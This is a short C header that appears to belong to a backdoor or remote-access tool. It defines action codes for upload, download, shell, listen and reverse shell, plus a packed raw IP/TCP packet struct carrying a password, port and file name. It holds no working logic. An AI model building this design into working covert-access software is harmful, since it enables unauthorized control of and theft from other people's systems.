#ifndef ACTIONS_H
#define ACTIONS_H

#include <netinet/ip.h>
#include <netinet/tcp.h>

#define UPLOAD      1
#define DOWNLOAD    2
#define SHELL       3
#define CHECK       4
#define LISTEN      5
#define RUPLOAD     6
#define RDOWNLOAD   7
#define RSHELL      8

#define BUFSIZE 256

struct data {
    unsigned char pass[20];
    unsigned short port;
    unsigned int action;
    char file[64];
    unsigned long size;
} __attribute__ ((packed));

struct packet {
    struct ip ip;
    struct tcphdr tcp;
    unsigned char options[12];
    struct data action;
} __attribute__ ((packed));

#endif
